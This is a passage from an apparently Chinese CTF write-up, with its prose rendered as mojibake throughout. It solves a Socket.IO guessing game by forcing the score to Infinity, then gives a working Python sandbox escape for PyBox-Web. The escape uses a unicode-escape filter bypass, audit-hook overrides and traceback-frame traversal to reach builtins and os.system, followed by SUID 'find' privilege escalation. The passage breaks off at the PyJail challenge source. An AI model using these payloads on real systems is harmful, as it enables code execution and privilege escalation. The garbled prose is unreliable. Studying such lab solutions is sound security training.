class="hljs-attr">message</span>: message,<br>                        <span class="hljs-attr">score</span>: totalScore,<br>                        <span class="hljs-attr">showFlag</span>: showFlag,<br>                        <span class="hljs-attr">currentScore</span>: currentScore<br>                    &#125;);<br>                    <br>                    targetNumber = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ–°ç›®æ ‡æ•°å­—: <span class="hljs-subst">$&#123;targetNumber&#125;</span>`</span>);<br>                    guessCount = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (guessCount &gt;= <span class="hljs-number">100</span>) &#123;<br>                      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;100æ¬¡æœªçŒœä¸­ï¼å°†æ‰£é™¤å½“å‰åˆ†æ•°å¹¶é‡ç½®&quot;</span>);<br>                        socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;punishment&#x27;</span>, &#123;<br>                            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;100æ¬¡æœªçŒœä¸­ï¼å°†æ‰£é™¤å½“å‰åˆ†æ•°å¹¶é‡ç½®&quot;</span>,<br>                        &#125;);<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>                        <span class="hljs-attr">win</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">message</span>: guess &lt; targetNumber ? <span class="hljs-string">&#x27;å¤ªå°äº†ï¼&#x27;</span> : <span class="hljs-string">&#x27;å¤ªå¤§äº†ï¼&#x27;</span>,<br>                        <span class="hljs-attr">score</span>: totalScore<br>                    &#125;);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>                socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>                    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span>,<br>                    <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span>,<br>                    <span class="hljs-attr">score</span>: totalScore<br>                &#125;);<br>            &#125;<br>        &#125;);<br>        socket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;punishment-response&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-property">score</span>);<br>          totalScore -= data.<span class="hljs-property">score</span>;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(totalScore);<br>          guessCount = <span class="hljs-number">0</span>;<br>          targetNumber = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">1</span>;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ–°ç›®æ ‡æ•°å­—: <span class="hljs-subst">$&#123;targetNumber&#125;</span>`</span>);<br>          socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;game-message&#x27;</span>, &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;result&#x27;</span>,<br>            <span class="hljs-attr">win</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;æ‰£é™¤åˆ†æ•°å¹¶é‡ç½®&quot;</span>,<br>            <span class="hljs-attr">score</span>: totalScore,<br>            <span class="hljs-attr">showFlag</span>: <span class="hljs-literal">false</span>,<br>          &#125;);<br><br>        &#125;);<br>    &#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p>åˆ†æ•°è¦å¤§äº<code>1.7976931348623157e308</code>æ‰ä¼šç»™flagè¿™ä¸ªæ•°æ°æ°æ˜¯jsä¸­<code>Number.MAX_VALUE</code>ï¼Œä½†æ˜¯å¦‚æœè¶…è¿‡è¿™ä¸ªå€¼å°±ä¼šå˜æˆ<code>Infinity</code>ï¼Œåªæœ‰<code>Infinity&gt;Number.MAX_VALUE</code>æ‰æ˜¯<code>true</code>ï¼Œ</p><p>åç«¯ç›‘å¬çš„<code>&#39;punishment-response&#39;</code>æ‰§è¡Œ<code>totalScore -= data.score;</code>ï¼Œè€Œdataæ˜¯å‰ç«¯å¯æ§çš„ï¼Œ</p><p>ä½†æ˜¯ç›´æ¥<code>socket.emit(&#39;punishment-response&#39;, &#123;  score: -1.8e308 &#125;);</code>åªè¦è¿™ä¸ªæ•°å¤§äº<code>Number.MAX_VALUE</code>ï¼ˆæˆ‘ä»¬è¿™é‡Œç§°ä¸º<code>Infinity</code>ï¼‰,å®é™…å°±æ˜¯<code>socket.emit(&#39;punishment-response&#39;, &#123;  score: -Infinity &#125;);</code>ä¼šå¤±è´¥ï¼ŒåŸå› æ˜¯</p><p>Socket.IO åœ¨ä¼ è¾“æ•°æ®æ—¶ä½¿ç”¨çš„æ˜¯ JSON åºåˆ—åŒ–ã€‚å¦‚æœå€¼æ˜¯ <code>Infinity</code>ã€<code>-Infinity</code> æˆ– <code>NaN</code>ï¼Œè¿™äº›æ˜¯ <strong>ä¸èƒ½è¢« JSON è¡¨ç¤ºçš„</strong>ï¼Œä¼šè¢«åºåˆ—åŒ–æˆ <code>null</code></p><p><code>JSON.stringify(&#123; score: -Infinity &#125;); // &#39;&#123;&quot;score&quot;:null&#125;&#39;</code>æ‰€ä»¥å¾—è®©Socket.IOä¼ è¾“çš„æ—¶å€™æ­£å¸¸ä¼ ï¼ˆä¸è¢«åºåˆ—åŒ–ä¸ºæ— æ•ˆå€¼ï¼‰</p><p>è¿™é‡Œçš„è§£å†³åŠæ³•æ˜¯<code>&#123;  score: &quot;-Infinity&quot; &#125;</code>ï¼ˆå­—ç¬¦ä¸²ï¼‰æˆ–è€…å‘<code>-1e308</code>ï¼ˆå°äº<code>Number.MAX_VALUE</code>ï¼‰å¤šå‘å‡ æ¬¡åç«¯ä¸€è¿ç®—è¿˜æ˜¯<code>Infinity</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">socket = <span class="hljs-title function_">io</span>();<br><span class="hljs-comment">//socket.emit(&#x27;punishment-response&#x27;, &#123;</span><br><span class="hljs-comment">//  score: &quot;-Infinity&quot;</span><br><span class="hljs-comment">//&#125;);æˆ–è€…ä¸‹é¢çš„</span><br>socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;punishment-response&#x27;</span>, &#123;<br>  <span class="hljs-attr">score</span>: -<span class="hljs-number">1e308</span><br>&#125;);<br>socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;punishment-response&#x27;</span>, &#123;<br>  <span class="hljs-attr">score</span>: -<span class="hljs-number">1e308</span><br>&#125;);<br><span class="hljs-comment">//çŒœå¯¹è¿™é‡Œå¯äºŒåˆ†æ³•çŒœ,æ‰‹è¯•äºŒåˆ†æ³•ä¹Ÿok,å…¶å®forå¾ªç¯çˆ†ä¹Ÿå‹</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100</span>;i++)<br> socket.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;guess&#x27;</span>, &#123;<br>   <span class="hljs-attr">value</span>: i<br> &#125;);<br> socket.<span class="hljs-title function_">on</span>(<br>   <span class="hljs-string">&#x27;game-message&#x27;</span>,<br>   <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-property">message</span>);<br>   &#125;);<br></code></pre></td></tr></table></figure><p>å¡æ§åˆ¶å°è¿è¡Œ</p><p>è¿™é¢˜çš„å…³é”®è¿˜æ˜¯<code>Socket.IO</code>ä¼ è¾“å°†<code>-Infinity</code>ç³»åˆ—åŒ–ä¸º<code>null</code>ï¼Œå¯èƒ½ä¼šæœ‰äººå¡åœ¨è¿™æ‡µé€¼</p><h2 id="PyBox-Web"><a href="#PyBox-Web" class="headerlink" title="PyBox-Web"></a>PyBox-Web</h2><p>è¿›å»ç›´æ¥ç»™æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> ast<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SandboxVisitor</span>(ast.NodeVisitor):<br>    forbidden_attrs = &#123;<br>        <span class="hljs-string">&quot;__class__&quot;</span>, <span class="hljs-string">&quot;__dict__&quot;</span>, <span class="hljs-string">&quot;__bases__&quot;</span>, <span class="hljs-string">&quot;__mro__&quot;</span>, <span class="hljs-string">&quot;__subclasses__&quot;</span>,<br>        <span class="hljs-string">&quot;__globals__&quot;</span>, <span class="hljs-string">&quot;__code__&quot;</span>, <span class="hljs-string">&quot;__closure__&quot;</span>, <span class="hljs-string">&quot;__func__&quot;</span>, <span class="hljs-string">&quot;__self__&quot;</span>,<br>        <span class="hljs-string">&quot;__module__&quot;</span>, <span class="hljs-string">&quot;__import__&quot;</span>, <span class="hljs-string">&quot;__builtins__&quot;</span>, <span class="hljs-string">&quot;__base__&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_Attribute</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node.attr, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> node.attr <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.forbidden_attrs:<br>            <span class="hljs-keyword">raise</span> ValueError<br>        <span class="hljs-variable language_">self</span>.generic_visit(node)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_GeneratorExp</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-keyword">raise</span> ValueError<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_executor</span>(<span class="hljs-params">code, result_queue</span>):<br>    safe_builtins = &#123;<br>        <span class="hljs-string">&quot;print&quot;</span>: <span class="hljs-built_in">print</span>,<br>        <span class="hljs-string">&quot;filter&quot;</span>: <span class="hljs-built_in">filter</span>,<br>        <span class="hljs-string">&quot;list&quot;</span>: <span class="hljs-built_in">list</span>,<br>        <span class="hljs-string">&quot;len&quot;</span>: <span class="hljs-built_in">len</span>,<br>        <span class="hljs-string">&quot;addaudithook&quot;</span>: sys.addaudithook,<br>        <span class="hljs-string">&quot;Exception&quot;</span>: Exception<br>    &#125;<br>    safe_globals = &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: safe_builtins&#125;<br><br>    sys.stdout = io.StringIO()<br>    sys.stderr = io.StringIO()<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">exec</span>(code, safe_globals)<br>        output = sys.stdout.getvalue()<br>        error = sys.stderr.getvalue()<br>        result_queue.put((<span class="hljs-string">&quot;ok&quot;</span>, output <span class="hljs-keyword">or</span> error))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        result_queue.put((<span class="hljs-string">&quot;err&quot;</span>, <span class="hljs-built_in">str</span>(e)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_exec</span>(<span class="hljs-params">code: <span class="hljs-built_in">str</span>, timeout=<span class="hljs-number">1</span></span>):<br>    code = code.encode().decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br>    tree = ast.parse(code)<br>    SandboxVisitor().visit(tree)<br>    result_queue = multiprocessing.Queue()<br>    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))<br>    p.start()<br>    p.join(timeout=timeout)<br><br>    <span class="hljs-keyword">if</span> p.is_alive():<br>        p.terminate()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Timeout: code took too long to run.&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        status, output = result_queue.get_nowait()<br>        <span class="hljs-keyword">return</span> output <span class="hljs-keyword">if</span> status == <span class="hljs-string">&quot;ok&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;output&#125;</span>&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: no output from sandbox.&quot;</span><br><br>CODE = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">def my_audit_checker(event,args):</span><br><span class="hljs-string">    allowed_events = [&quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;]</span><br><span class="hljs-string">    if not list(filter(lambda x: event == x, allowed_events)):</span><br><span class="hljs-string">        raise Exception</span><br><span class="hljs-string">    if len(args) &gt; 0:</span><br><span class="hljs-string">        raise Exception</span><br><span class="hljs-string"></span><br><span class="hljs-string">addaudithook(my_audit_checker)</span><br><span class="hljs-string">print(&quot;&#123;&#125;&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>badchars = <span class="hljs-string">&quot;\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_.&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/execute&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>():<br>    text = request.form[<span class="hljs-string">&#x27;text&#x27;</span>]<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> badchars:<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br>    output=safe_exec(CODE.<span class="hljs-built_in">format</span>(text))<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output)&gt;<span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br>    <span class="hljs-keyword">return</span> Response(output, status=<span class="hljs-number">200</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>CODE.format(text)</code>å°†<code>text</code>æ›¿æ¢åˆ°<code>&#123;&#125;</code>ï¼Œç­‰ä»·äº<code>print(&quot;text&quot;)</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">text<span class="hljs-punctuation">=</span><span class="hljs-string">&quot;)</span><br><span class="hljs-meta">#è¿™é‡Œæ‰§è¡Œä»£ç </span><br>print<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>å°±å¯ä»¥æ‰§è¡Œä»£ç äº†ï¼Œç„¶åè¦ç»•<code>badchars</code>ï¼Œ<code>safe_exec</code>ä¸­<code>code = code.encode().decode(&#39;unicode_escape&#39;)</code></p><p>unicode_escapeä¼šè§£æ Unicode è½¬ä¹‰åºåˆ—ï¼Œåªéœ€è¦<strong>å°†textçš„å€¼unicodeç¼–ç </strong>ï¼Œåœ¨safe_execä¸­å°±ä¼šè¿˜åŸå›åŸå­—ç¬¦ï¼ˆå°±æ˜¯ç¼–ç è§£ç ä¸ä¸€è‡´è¿˜æ˜¯åœ¨badcharåè§£çš„ç ï¼‰</p><p>ç„¶åå°±æ˜¯å®¡è®¡é’©å­çš„ç»•è¿‡ï¼Œå°±å¾ˆç®€å•ä¸€æŸ¥å°±æœ‰å¼ºç½‘æ¯çš„é¢˜ï¼Œ<strong>é‡å†™listä¸lenæ–¹æ³•å°±è¡Œ</strong></p><p>ç„¶åå°±æ˜¯astçš„ç»•è¿‡ï¼Œç¦æ­¢äº†<strong>ç”Ÿæˆå™¨</strong>ä¸ä¸€äº›<strong>é­”æœ¯å±æ€§ä¸æ–¹æ³•</strong>ï¼Œç„¶åå°±ä¸èƒ½ç”Ÿæˆå™¨æ ˆå¸§é€ƒé€¸ä¸ç»§æ‰¿é“¾åº”è¯¥ä¹Ÿä¸å¤ªè¡Œçš„é€š</p><p>æå‡è·ŸExceptionæœ‰å…³ï¼Œä¸€æŸ¥åº”è¯¥éƒ½èƒ½æŸ¥å‡ºæ¥ï¼Œ<strong>å¼‚å¸¸æ ˆå¸§é€ƒé€¸</strong>(æœ‰å¾ˆå¤šæ–¹æ³•å§ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªæœ€å¥½æŸ¥ï¼Ÿæ‰€ä»¥æå‡ç»™äº†å¯èƒ½ï¼Ÿ)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">try:<br>    <span class="hljs-number">1</span>/<span class="hljs-number">0</span><br>except Exception as e:<br>    frame = e.__traceback__<span class="hljs-selector-class">.tb_frame</span><span class="hljs-selector-class">.f_back</span><br>    builtins = frame<span class="hljs-selector-class">.f_globals</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br></code></pre></td></tr></table></figure><p><code>e.__traceback__</code> â†’ æŒ‡å‘å¼‚å¸¸å‘ç”Ÿæ—¶çš„ <strong>traceback</strong> å¯¹è±¡</p><p>traceback é‡ŒåŒ…å« <code>tb_frame</code> â†’ æŒ‡å‘å¼‚å¸¸å‘ç”Ÿçš„ <strong>æ ˆå¸§ frame å¯¹è±¡</strong></p><p>frame é‡ŒåŒ…å« <code>f_locals</code>ã€<code>f_globals</code>ã€<code>f_back</code> â†’ å¯ä»¥æ²¿ç€é“¾æ¡è®¿é—®ä¹‹å‰çš„å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡ã€è°ƒç”¨æ ˆ</p><p>å¯ä»¥é€ƒé€¸åˆ°execå¤–çš„å…¨å±€æ‹¿<code>__builtins__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">text=<span class="hljs-string">&quot;)</span><br><span class="hljs-string">list=lambda x:True</span><br><span class="hljs-string">len=lambda x:False</span><br><span class="hljs-string"></span><br><span class="hljs-string">try:</span><br><span class="hljs-string">    1/0</span><br><span class="hljs-string">except Exception as e:</span><br><span class="hljs-string">    frame = e.__traceback__.tb_frame.f_back</span><br><span class="hljs-string">    builtins = frame.f_globals[&#x27;__builtins__&#x27;]</span><br><span class="hljs-string">    builtins.exec(&quot;</span>builtins.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;ls / -al&gt;app.py&#x27;</span>)<span class="hljs-string">&quot;)    #è¿™é‡Œ__import__è¢«actæ‹¦äº†ï¼Œæ‰€ä»¥æ”¾æˆå­—ç¬¦ä¸²ä¸¢åˆ°execé‡Œï¼ˆä¹Ÿå¯ä»¥ç”¨__getattribute__è·å–__import__ï¼‰</span><br><span class="hljs-string">    #frame.f_globals[&#x27;SandboxVisitor&#x27;].visit_Attribute=lambda x,y:None  #é‡å†™visit_Attributeå</span><br><span class="hljs-string">    #builtins.__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;app.py&#x27;) #ä¹Ÿok</span><br><span class="hljs-string">print(&quot;</span><br><br><span class="hljs-comment">#å¾—unicodeç¼–ç </span><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å¾ˆå¤šå…¶ä»–åšæ³•ï¼Œæ¯”å¦‚__getattribute__ç»•ï¼Œyeildå…³é”®å­—æ„é€ ç”Ÿæˆå™¨,  é—­åŒ…æ ˆå¸§é€ƒé€¸ï¼Œ __newobj__çš„__builtins__å±æ€§ï¼Œè¿™é¢˜ç›¸æ¯”pyjailæ¯”è¾ƒå¼€æ”¾ï¼Œç½‘ä¸ŠæŸ¥æŸ¥åº”è¯¥éƒ½èƒ½æŸ¥å‡ºæ¥</p><p>å› ä¸ºæœ‰len(output)&lt;&#x3D;5é™åˆ¶ï¼Œå¯ä»¥å½“æ²¡å›æ˜¾æ¥æ‰“(å†™app.pyæˆ–è€…åˆ›å»ºstaticç›®å½•å¾€é‡Œå†™)ï¼Œä¹Ÿå¯ä»¥ä¸€ç‚¹ä¸€ç‚¹è¯»</p><p>ç„¶åå½“å‰ç”¨æˆ·minilUseræ²¡æƒé™è¯»&#x2F;m1n1FL@Gï¼Œéœ€è¦ææƒï¼Œå¾ˆç®€å•suidææƒï¼Œ24çº§çš„ç½‘å®‰å¯¼è®ºå®éªŒä¹Ÿæœ‰è¿™å†…å®¹</p><p>æŸ¥çœ‹entrypoint.shå°±å¯ä»¥çŸ¥é“äº†findæœ‰suidæƒé™ï¼Œä¹Ÿå¯ä»¥<code>find / -perm -4000 -type f 2&gt;/dev/null</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$FLAG</span> &gt; /m1n1FL@G<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\nNext, let&#x27;s tackle the more challenging misc/pyjail&quot;</span>&gt;&gt; /m1n1FL@G<br><span class="hljs-built_in">chmod</span> 600 /m1n1FL@G<br><span class="hljs-built_in">chown</span> root:root /m1n1FL@G<br><br><span class="hljs-built_in">chmod</span> 4755 /usr/bin/find<br><br>useradd -m minilUser<br><span class="hljs-built_in">export</span> FLAG=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">chmod</span> -R 777 /app<br>su minilUser -c <span class="hljs-string">&quot;python /app/app.py&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶å<code>find . -exec cat /m1* \; &gt;app.py</code></p><h2 id="PyJail-Misc"><a href="#PyJail-Misc" class="headerlink" title="PyJail-Misc"></a>PyJail-Misc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> io<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    source_code = f.read()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SandboxVisitor</span>(ast.NodeVisitor):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_Attribute</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node.attr, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> node.attr.startswith(<span class="hljs-string">&quot;__&quot;</span>):<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Access to private attributes is not allowed&quot;</span>)<br>        <span class="hljs-variable 